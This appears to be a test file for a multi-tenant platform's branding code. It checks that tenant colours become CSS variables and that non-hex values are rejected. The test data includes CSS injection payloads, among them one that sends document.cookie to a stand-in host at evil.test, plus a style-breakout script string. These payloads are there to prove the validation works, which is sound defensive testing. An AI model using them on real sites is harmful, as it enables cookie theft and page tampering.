import { resolveConfig } from "@tenure/configuration"

import { brandingCss } from "./branding"
import { REGISTRY, brandingFor, layersFor } from "./system-config"

describe("each system carries its own identity", () => {
  it("gives the pilot Tenure's own brand", () => {
    expect(brandingFor("rochester")).toEqual({
      primaryColor: "#1c8c5a",
      primaryTextColor: "#ffffff",
      wordmark: "Tenure",
    })
  })

  it("gives the nonprofit a different one", () => {
    const b = brandingFor("midtown-arts")
    expect(b.primaryColor).toBe("#7a3fb8")
    expect(b.wordmark).toBe("Midtown")
  })
})

describe("branding reaches the page as CSS, and cannot escape it", () => {
  const attempt = (values: Record<string, unknown>) =>
    resolveConfig(REGISTRY, [...layersFor("rochester"), { scope: "tenant", id: "rochester", values }], {
      collectProblems: true,
    })

  it("emits nothing when nothing differs from the default", () => {
    // The common case should not add bytes to every document.
    expect(brandingCss(brandingFor("rochester"))).toBe("")
  })

  it("emits a variable block for a tenant that has changed it", () => {
    const css = brandingCss(brandingFor("midtown-arts"))
    expect(css).toContain("--primary: #7a3fb8")
    expect(css.startsWith(":root{")).toBe(true)
    expect(css.endsWith("}")).toBe(true)
  })

  it("derives the hover and press shades rather than asking for them", () => {
    // Asking an administrator for a colour ramp is asking them to get contrast
    // wrong in three new places.
    const css = brandingCss(brandingFor("midtown-arts"))
    expect(css).toContain("--primary-hover")
    expect(css).toContain("--primary-press")
    expect(css).toContain("--primary-light")
  })

  it("refuses anything that is not a plain hex colour", () => {
    // These values are interpolated into a <style> block, so an unvalidated
    // string is a CSS injection and, with the right payload, an exfiltration
    // channel. The allowlist is what makes that impossible rather than unlikely.
    for (const attack of [
      "red; } body { display: none } :root {",
      "url(https://evil.test/x)",
      "#fff; background-image: url('https://evil.test/?c='+document.cookie)",
      "rgb(255,0,0)",
      "expression(alert(1))",
      "#12345",
      "",
    ]) {
      expect(attempt({ "platform.branding.primaryColor": attack }).config).toBeNull()
    }
  })

  it("accepts both short and long hex forms", () => {
    for (const ok of ["#fff", "#FFF", "#1c8c5a", "#1C8C5A"]) {
      expect(attempt({ "platform.branding.primaryColor": ok }).config).not.toBeNull()
    }
  })

  it("drops a bad value at render time too, not only at publication", () => {
    // A defence that lives only at the far end of a call chain is one a future
    // refactor removes without noticing. There is no correct escaping of a
    // colour that is not one, so it is dropped rather than escaped.
    const css = brandingCss({
      primaryColor: "red; } * { display: none } :root {",
      primaryTextColor: "#000000",
      wordmark: "X",
    })
    expect(css).not.toContain("display: none")
    expect(css).not.toContain("red")
  })

  it("keeps the wordmark out of CSS entirely", () => {
    // It is rendered as text, never as markup and never as a CSS value.
    const css = brandingCss({ primaryColor: "#123456", primaryTextColor: "#ffffff", wordmark: "</style><script>" })
    expect(css).not.toContain("script")
    expect(css).not.toContain("style")
  })

  it("bounds the wordmark's length", () => {
    expect(attempt({ "platform.branding.wordmark": "x".repeat(41) }).config).toBeNull()
    expect(attempt({ "platform.branding.wordmark": "" }).config).toBeNull()
  })

  it("is not user-settable — one person cannot rebrand an institution", () => {
    const { problems } = resolveConfig(
      REGISTRY,
      [...layersFor("rochester"), { scope: "user", id: "u1", values: { "platform.branding.primaryColor": "#ff0000" } }],
      { collectProblems: true },
    )
    expect(problems[0].reason).toBe("scope-not-allowed")
  })
})
